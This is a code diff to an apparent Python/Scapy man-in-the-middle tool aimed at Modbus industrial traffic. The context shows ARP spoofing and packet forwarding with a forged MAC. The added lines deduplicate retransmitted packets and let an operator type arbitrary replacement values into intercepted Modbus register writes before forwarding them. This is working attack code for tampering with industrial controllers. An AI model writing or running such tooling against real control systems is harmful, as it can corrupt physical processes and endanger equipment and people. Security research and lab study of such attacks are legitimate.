@@ -101,6 +101,35 @@ def restore_arp(iface, victim_ip, victim_mac, target_ip, target_mac):
         sendp(pkt2, iface=iface, verbose=0)
         time.sleep(0.3)
 
+seen_seqs = {}  # key: (src, sport, dst, dport) -> set of seq numbers seen
+
+def stream_key(pkt):
+    ip = pkt[IP]
+    tcp = pkt[TCP]
+    return (ip.src, tcp.sport, ip.dst, tcp.dport)
+
+def is_retransmission(pkt):
+    if not (pkt.haslayer(IP) and pkt.haslayer(TCP)):
+        return
+
+    key = stream_key(pkt)
+    seq = pkt[TCP].seq
+    payload_len = len(pkt[TCP].payload)
+
+    # Only meaningful for segments carrying data (or SYN, which consumes a seq)
+    if payload_len == 0 and "S" not in pkt[TCP].flags:
+        return
+
+    if key not in seen_seqs:
+        seen_seqs[key] = set()
+
+    if seq in seen_seqs[key]:
+        print(f"Retransmission detected: {key} seq={seq}")
+        return True
+    else:
+        seen_seqs[key].add(seq)
+        print(f"Not a retransmission: {key} seq={seq}")
+        return False
 
 def handle_packet(pkt, port, log_file,mappings,own_mac):
     src = own_mac
@@ -113,7 +142,10 @@ def handle_packet(pkt, port, log_file,mappings,own_mac):
     npkt[Ether].src=src
     npkt[Ether].dst=mappings[dst]
 
+
     if npkt.haslayer(ModbusADURequest):
+        if is_retransmission(npkt):
+            return
         mb = npkt[ModbusADURequest]
     # elif npkt.haslayer(ModbusADUResponse):
     #     mb = npkt[ModbusADUResponse]
@@ -133,10 +165,16 @@ def handle_packet(pkt, port, log_file,mappings,own_mac):
     
     if npkt.haslayer(ModbusADURequest):
         original_value = npkt[ModbusADURequest].registerValue
-        npkt[ModbusADURequest].registerValue=1 # new value
+        
+        
         print("\nFunction:\t\t" + MODBUS_FUNCTION_CODES.get(npkt[ModbusADURequest].funcCode))
         print("Register Address:\t",npkt[ModbusADURequest].registerAddr)
         print("Original Value:\t\t",original_value)
+
+        new_value = input("Enter new value:")
+        # new_value=99
+        npkt[ModbusADURequest].registerValue=int(new_value)
+
         print("New Value:\t\t",npkt[ModbusADURequest].registerValue)
         # npkt[ModbusADURequest].transId=4660
     # elif npkt.haslayer(ModbusADUResponse):
@@ -149,7 +187,8 @@ def handle_packet(pkt, port, log_file,mappings,own_mac):
     del npkt[IP].chksum
 
     # print(npkt.show(dump=True))
-    sendp(npkt,loop=0,inter=0.2,verbose=0)
+    sendp(npkt,loop=0,inter=0.2,verbose=0) #try making this send and recieve to analysis the response
+ 
 
 def banner():
     print(f'''                                                                                                 
